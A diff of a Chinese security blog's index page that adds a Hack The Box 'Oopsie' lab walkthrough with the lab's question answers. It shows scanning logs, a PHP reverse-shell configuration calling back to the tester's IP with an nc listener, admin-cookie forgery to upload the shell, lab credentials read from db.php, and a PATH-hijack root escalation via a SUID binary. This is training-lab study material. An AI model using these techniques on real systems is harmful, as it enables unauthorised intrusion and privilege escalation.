@@ -284,18 +284,18 @@ mjx-container[display="true"] + br {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-count">94</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-count">45</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -320,6 +320,659 @@ mjx-container[display="true"] + br {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/05/17/Hackthebox-StartingPoint-Tier2-Oopsie/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/kehan.jpg">
+      <meta itemprop="name" content="Aono">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aono Note">
+      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Aono Note">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/05/17/Hackthebox-StartingPoint-Tier2-Oopsie/" class="post-title-link" itemprop="url">Hackthebox-StartingPoint-Tier2-Oopsie</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-05-17 20:45:28 / 修改时间：20:49:32" itemprop="dateCreated datePublished" datetime="2026-05-17T20:45:28+08:00">2026-05-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HTB/" itemprop="url" rel="index"><span itemprop="name">HTB</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>With what kind of tool can intercept web traffic? Proxy</p>
+<p>What is the path to the directory on the webserver that returns a login page? /cdn-cgi/login</p>
+<p>What can be modified in Firefox to get access to the upload page? cookie</p>
+<p>What is the access ID of the admin user? 34322</p>
+<p>On uploading a file, what directory does that file appear in on the server? /uploads</p>
+<p>What is the file that contains the password that is shared with the robert user? db.php</p>
+<p>What executible is run with the option “-group bugtracker” to identify all files owned by the bugtracker group? find</p>
+<p>Regardless of which user starts running the bugtracker executable, what’s user privileges will use to run? root</p>
+<p>What SUID stands for? Set owner User ID</p>
+<p>What is the name of the executable being called in an insecure manner? cat</p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>当拿到user shell后，可以收集信息，找到其他可登录用户，查看用户当前的用户组，看当前用户所属的组下是否有SUID的文件，可以用来提权。以该目标为例，找到了rebort这个用户为例，在db.php下找到了该用户和密码，然后发现该用户属于bugtracker组，然后找到了这个组下有一个setuid文件可以用来提权。</p>
+<p>通常称为 SUID（设置所有者用户 ID），这种特殊的权限设置只有一个功能：无论执行命令的用户是谁，带有 SUID 的文件始终以文件所有者的身份执行。如果文件所有者没有执行权限，则此处使用大写字母 S。在本例中，二进制文件“bugtracker”的所有者是 root 用户，由于它设置了 SUID，我们可以以 root 用户身份执行它。</p>
+<p>SUID Set owner User ID</p>
+<h2 id="详细记录"><a href="#详细记录" class="headerlink" title="详细记录"></a>详细记录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --min-rate 5000 10.129.95.191</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> zyu:</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-15 19:36 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.95.191</span><br><span class="line">Host is up (0.41s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line"> <span class="built_in">sudo</span> nmap -p 22,80 -sCV 10.129.95.191</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-15 19:39 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.95.191</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)</span><br><span class="line">|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)</span><br><span class="line">|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Welcome</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">gobuster <span class="built_in">dir</span> -url http://10.129.95.191/ -w usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php</span><br><span class="line"></span><br><span class="line">gobuster <span class="built_in">dir</span> -url http://10.129.95.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.8.2</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.129.95.191/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.8.2</span><br><span class="line">[+] Extensions:              php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">index.php            (Status: 200) [Size: 10932]</span><br><span class="line">images               (Status: 301) [Size: 315] [--&gt; http://10.129.95.191/images/]</span><br><span class="line">themes               (Status: 301) [Size: 315] [--&gt; http://10.129.95.191/themes/]</span><br><span class="line">uploads              (Status: 301) [Size: 316] [--&gt; http://10.129.95.191/uploads/]</span><br><span class="line">css                  (Status: 301) [Size: 312] [--&gt; http://10.129.95.191/css/]</span><br><span class="line">js                   (Status: 301) [Size: 311] [--&gt; http://10.129.95.191/js/]</span><br><span class="line">Progress: 2660 / 175326 (1.52%)</span><br><span class="line"></span><br><span class="line">ip route get 10.129.95.191</span><br><span class="line">10.129.95.191 via 10.10.16.1 dev tun1 src 10.10.17.43 uid 1000</span><br><span class="line">    cache</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;10.10.17.43&#x27;</span>;  // CHANGE THIS</span><br><span class="line"><span class="variable">$port</span> = 1234;       // CHANGE THIS</span><br><span class="line"><span class="variable">$chunk_size</span> = 1400;</span><br><span class="line"><span class="variable">$write_a</span> = null;</span><br><span class="line"><span class="variable">$error_a</span> = null;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"></span><br><span class="line">nc -nvlp 1234</span><br><span class="line"></span><br><span class="line">POST /cdn-cgi/login/admin.php?content=uploads&amp;action=upload HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 10.129.134.99</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line"></span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------8283147031376903077732800488</span><br><span class="line"></span><br><span class="line">Content-Length: 5833</span><br><span class="line"></span><br><span class="line">Origin: http://10.129.134.99</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Referer: http://10.129.134.99/cdn-cgi/login/admin.php?content=uploads</span><br><span class="line"></span><br><span class="line">Cookie: user=2233; role=guest</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">修改cookie：Cookie: user=34322; role=admin</span><br><span class="line"></span><br><span class="line">The file shell.php has been uploaded.修改成管理员cookie才能成功上传。</span><br><span class="line">包括最后触发反弹shell的数据包也需要修改cookie：</span><br><span class="line">GET /uploads/shell.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 10.129.134.99</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Cookie: user=34322; role=admin</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Priority: u=0, i</span><br><span class="line">升级shell：python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>拿到shell后就不知道要去干什么了，应该是找对应网站的薄弱点，找一下当时发现的网站目录看看能否发现什么敏感的信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line"><span class="built_in">cd</span> cdn-cgi/login</span><br><span class="line"><span class="comment"># 查找当前目录下的明文密码</span></span><br><span class="line"><span class="built_in">cat</span> * | grep -i passw*</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> * | grep -i passw*</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]===<span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]===<span class="string">&quot;MEGACORP_4dm1n!!&quot;</span>)</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;Password&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">grep -i <span class="string">&quot;passw&quot;</span> *</span><br><span class="line">index.php:<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]===<span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]===<span class="string">&quot;MEGACORP_4dm1n!!&quot;</span>)</span><br><span class="line">index.php:&lt;input <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;Password&quot;</span> /&gt;</span><br><span class="line"><span class="built_in">cat</span> db.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;robert&#x27;</span>,<span class="string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="string">&#x27;garage&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>找到admin账号密码是MEGACORP_4dm1n!!</p>
+<p>找到robert的密码是M3g4C0rpUs3r!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert</span><br><span class="line">su robert</span><br><span class="line">Password: M3g4C0rpUs3r!</span><br><span class="line"></span><br><span class="line">robert@oopsie:/var/www/html/cdn-cgi/login$</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(robert) gid=1000(robert) <span class="built_in">groups</span>=1000(robert),1001(bugtracker)</span><br><span class="line"></span><br><span class="line">find / -group bugtracker 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">&lt;cdn-cgi/login$ find / -group bugtracker 2&gt;/dev/null</span><br><span class="line">/usr/bin/bugtracker</span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -la /usr/bin/bugtracker &amp;&amp; file /usr/bin/bugtracker</span><br><span class="line"></span><br><span class="line">robert@oopsie:/var/www/html/cdn-cgi/login$ <span class="built_in">ls</span> -la /usr/bin/bugtracker &amp;&amp; file /usr/bin/bugtracker</span><br><span class="line">&lt;-la /usr/bin/bugtracker &amp;&amp; file /usr/bin/bugtracker</span><br><span class="line">-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker</span><br><span class="line">/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>具有SUID权限，运行bugtracker程序查看，正常是查找bug的，当输入一个不存在的id编号时，会报错，无法cat文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">robert@oopsie:~$ /usr/bin/bugtracker</span><br><span class="line">/usr/bin/bugtracker</span><br><span class="line"></span><br><span class="line">------------------</span><br><span class="line">: EV Bug Tracker :</span><br><span class="line">------------------</span><br><span class="line"></span><br><span class="line">Provide Bug ID: 1</span><br><span class="line">1</span><br><span class="line">---------------</span><br><span class="line"></span><br><span class="line">Binary package hint: ev-engine-lib</span><br><span class="line"></span><br><span class="line">Version: 3.3.3-1</span><br><span class="line"></span><br><span class="line">Reproduce:</span><br><span class="line">When loading library <span class="keyword">in</span> firmware it seems to be crashed</span><br><span class="line"></span><br><span class="line">What you expected to happen:</span><br><span class="line">Synchronized browsing to be enabled since it is enabled <span class="keyword">for</span> that site.</span><br><span class="line"></span><br><span class="line">What happened instead:</span><br><span class="line">Synchronized browsing is disabled. Even choosing VIEW &gt; SYNCHRONIZED BROWSING from menu does not stay enabled between connects.</span><br><span class="line"></span><br><span class="line">robert@oopsie:~$ /usr/bin/bugtracker</span><br><span class="line">/usr/bin/bugtracker</span><br><span class="line"></span><br><span class="line">------------------</span><br><span class="line">: EV Bug Tracker :</span><br><span class="line">------------------</span><br><span class="line"></span><br><span class="line">Provide Bug ID: 4865as7fda</span><br><span class="line">4865as7fda</span><br><span class="line">---------------</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span>: /root/reports/4865as7fda: No such file or directory</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>所以只需要劫持cat就可以实现提权了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; <span class="built_in">cat</span></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="built_in">cat</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">head</span> root.txt</span><br></pre></td></tr></table></figure>
+<p>记录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">robert@oopsie:~$ <span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">robert@oopsie:/tmp$ <span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; <span class="built_in">cat</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; <span class="built_in">cat</span></span><br><span class="line">robert@oopsie:/tmp$ <span class="built_in">chmod</span> +x <span class="built_in">cat</span></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="built_in">cat</span></span><br><span class="line">robert@oopsie:/tmp$ <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">robert@oopsie:/tmp$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games</span><br><span class="line">/usr/bin/bugtracker</span><br><span class="line"></span><br><span class="line">------------------</span><br><span class="line">: EV Bug Tracker :</span><br><span class="line">------------------</span><br><span class="line"></span><br><span class="line">Provide Bug ID: ewhfuih1234</span><br><span class="line">ewhfuih1234</span><br><span class="line">---------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=1000(robert) <span class="built_in">groups</span>=1000(robert),1001(bugtracker)</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">reports  root.txt</span><br><span class="line"><span class="built_in">head</span> root.txt</span><br></pre></td></tr></table></figure>
+<p>关于strace </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">robert@oopsie:/tmp$ strace /usr/bin/bugtracker</span><br><span class="line">strace /usr/bin/bugtracker</span><br><span class="line">execve(<span class="string">&quot;/usr/bin/bugtracker&quot;</span>, [<span class="string">&quot;/usr/bin/bugtracker&quot;</span>], 0x7ffc91905a80 /* 24 vars */) = 0</span><br><span class="line">access(<span class="string">&quot;/etc/suid-debug&quot;</span>, F_OK)         = -1 ENOENT (No such file or directory)</span><br><span class="line">brk(NULL)                               = 0x557e55b64000</span><br><span class="line">fcntl(0, F_GETFD)                       = 0</span><br><span class="line">fcntl(1, F_GETFD)                       = 0</span><br><span class="line">fcntl(2, F_GETFD)                       = 0</span><br><span class="line">access(<span class="string">&quot;/etc/suid-debug&quot;</span>, F_OK)         = -1 ENOENT (No such file or directory)</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, R_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=36386, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 36386, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f0753153000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\260\34\2\0\0\0\0\0&quot;</span>..., 832) = 832</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0755, st_size=2030544, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f0753151000</span><br><span class="line">mmap(NULL, 4131552, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f0752b44000</span><br><span class="line">mprotect(0x7f0752d2b000, 2097152, PROT_NONE) = 0</span><br><span class="line">mmap(0x7f0752f2b000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7f0752f2b000</span><br><span class="line">mmap(0x7f0752f31000, 15072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f0752f31000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">arch_prctl(ARCH_SET_FS, 0x7f0753152500) = 0</span><br><span class="line">mprotect(0x7f0752f2b000, 16384, PROT_READ) = 0</span><br><span class="line">mprotect(0x557e54d1b000, 4096, PROT_READ) = 0</span><br><span class="line">mprotect(0x7f075315c000, 4096, PROT_READ) = 0</span><br><span class="line">munmap(0x7f0753153000, 36386)           = 0</span><br><span class="line">fstat(1, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...&#125;) = 0</span><br><span class="line">brk(NULL)                               = 0x557e55b64000</span><br><span class="line">brk(0x557e55b85000)                     = 0x557e55b85000</span><br><span class="line">write(1, <span class="string">&quot;\n&quot;</span>, 1</span><br><span class="line">)                       = 1</span><br><span class="line">write(1, <span class="string">&quot;------------------\n&quot;</span>, 19------------------</span><br><span class="line">)    = 19</span><br><span class="line">write(1, <span class="string">&quot;: EV Bug Tracker :\n&quot;</span>, 19: EV Bug Tracker :</span><br><span class="line">)    = 19</span><br><span class="line">write(1, <span class="string">&quot;------------------\n&quot;</span>, 19------------------</span><br><span class="line">)    = 19</span><br><span class="line">write(1, <span class="string">&quot;\n&quot;</span>, 1</span><br><span class="line">)                       = 1</span><br><span class="line">fstat(0, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...&#125;) = 0</span><br><span class="line">write(1, <span class="string">&quot;Provide Bug ID: &quot;</span>, 16Provide Bug ID: )        = 16</span><br><span class="line"><span class="built_in">read</span>(0,</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
